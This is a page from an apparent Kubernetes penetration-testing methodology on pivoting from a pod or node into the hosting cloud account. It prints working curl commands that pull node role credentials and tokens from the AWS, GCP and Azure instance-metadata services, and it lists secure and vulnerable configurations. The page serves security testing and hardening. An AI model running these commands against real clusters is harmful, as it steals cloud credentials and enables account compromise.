# Kubernetes · Phase 5 — Cluster → Cloud

> OWASP [K08 Cluster to Cloud Lateral Movement](../_kubernetes-base/K08-Cluster-To-Cloud-Lateral-Movement.md).
> The highest-impact pivot: from a pod/node, reach the **cloud account** hosting
> the cluster. Detected on the cloud side — hand off to the matching
> [cloud methodology](../_cloud-base/README.md).

#### T1552.005 Node/pod → cloud instance credentials  ⭐
- **Component/sink:** the node's cloud **instance metadata** service, reachable
  from a pod when egress isn't restricted (K05) or after a node breakout (K01).
  ```sh
  # AWS node role:
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
  # GCP node SA token:
  curl -H "Metadata-Flavor: Google" \
    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
  # Azure node managed identity:
  curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
  ```
- **Positive (secure):** metadata egress blocked from pods (NetworkPolicy / GKE
  Workload Identity / EKS IMDSv2 hop-limit 1 + `kube2iam`/IRSA, not the node
  role); node role is least-privilege.
- **Negative (vulnerable):** pod retrieves the **node's** cloud role/token →
  you now act in the cloud account with the node's permissions. If that role is
  broad (common), this is full cloud-account compromise.

#### Managed-cluster IAM integration
- **EKS:** IRSA (`eks.amazonaws.com/role-arn` on the SA) — a pod assumes an IAM
  role; test whether that role is over-privileged (→ [AWS Phase 3](../aws/03-privilege-escalation.md)).
- **GKE:** Workload Identity binds a KSA to a GCP SA — check the SA's roles
  (→ [GCP Phase 3](../gcp/03-privilege-escalation.md)).
- **AKS:** pod-managed identity / the kubelet identity (→ [Azure](../azure/03-privilege-escalation.md)).

#### Hand-off
Once you hold cloud credentials, continue in the provider methodology
([AWS](../aws/README.md) · [GCP](../gcp/README.md) · [Azure](../azure/README.md))
— privilege escalation, lateral movement, and impact in the cloud account.

---
*Next: [Phase 6 — Evasion & Impact](06-evasion-and-impact.md).*
